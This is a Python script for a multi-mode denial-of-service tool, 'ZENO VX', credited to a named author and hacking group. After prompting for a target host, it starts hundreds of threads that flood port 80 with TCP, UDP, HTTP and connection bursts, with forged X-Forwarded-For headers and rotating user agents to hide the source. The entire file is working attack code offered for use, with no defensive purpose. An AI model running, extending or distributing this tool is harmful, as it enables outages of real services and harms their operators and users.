#!/usr/bin/env python3

import os
import socket
import threading
import random
import time
import platform
import sys

# Auto Clear
if platform.system() == "Linux":
    os.system("clear")
else:
    print("This script is only for Linux Ubuntu.")
    sys.exit()

# Banner
print("\033[95m" + "#" * 60)
print("#\033[91m                  ZENO VX - Multiverse Erasure              \033[95m#")
print("#\033[92m       LOIC | HOIC | XerXes | Nano | ZENO V1 - V5 Combined  \033[95m#")
print("#\033[92m         IP Stealth Mode Active - Ubuntu Optimized          \033[95m#")
print("#\033[94m        Author: Rifqi Asy-Syakur aka Front Man              \033[95m#")
print("#\033[94m           Group: HDN Cyber Forces | ZENO Protocol          \033[95m#")
print("#" * 60 + "\033[0m")
print("\033[91m[!] ZENO-VX INITIALIZED. BEGIN ABSOLUTE PURGE...\033[0m\n")

# Input IP
target = input("\033[94m[>] Target IP/Host: \033[0m")
port = 80  # Auto HTTP port
threads = 500  # Recommended threads
delay = 0.001

# Spoofed IP Generator
def spoof_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# User-Agents for HOIC
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/7.68.0", "Wget/1.20.3"
]

# Payloads ala Nano + LOIC
def tcp_payload():
    return random._urandom(1024)

def udp_payload():
    return random._urandom(1500)

def http_payload(spoofed_ip):
    user_agent = random.choice(user_agents)
    headers = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"X-Forwarded-For: {spoofed_ip}\r\n"
        f"Connection: Keep-Alive\r\n\r\n"
    )
    return headers.encode()

# Mode TCP Flood
def tcp_attack():
    while True:                                                                                                                                                                          try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(tcp_payload())
            print("\033[92m[+] TCP packet sent\033[0m")
            s.close()
        except:
            print("\033[91m[-] TCP attack failed\033[0m")
        time.sleep(delay)

# Mode UDP Flood
def udp_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(udp_payload(), (target, port))
            print("\033[93m[+] UDP packet sent\033[0m")
        except:
            print("\033[91m[-] UDP attack failed\033[0m")
        time.sleep(delay)

# Mode HTTP Flood ala HOIC
def http_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            spoofed = spoof_ip()
            s.send(http_payload(spoofed))
            print(f"\033[96m[+] HTTP request sent with spoofed IP: {spoofed}\033[0m")
            s.close()
        except:
            print("\033[91m[-] HTTP attack failed\033[0m")
        time.sleep(delay)

# Mode SYN Flood ala XerXes (brutal connect/disconnect)
def syn_attack():
    while True:
        try:
            s = socket.socket()
            s.connect((target, port))
            s.close()
            print("\033[95m[+] SYN burst\033[0m")
        except:
            pass
        time.sleep(delay)

# Jalankan semua metode serangan
def run_all():
    for _ in range(threads):
        threading.Thread(target=tcp_attack).start()
        threading.Thread(target=udp_attack).start()
        threading.Thread(target=http_attack).start()
        threading.Thread(target=syn_attack).start()

# Clear screen lagi sebelum serangan
os.system("clear")
run_all()

# Loop utama
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n\033[91m[!] ZENO-VX Terminated by User\033[0m")
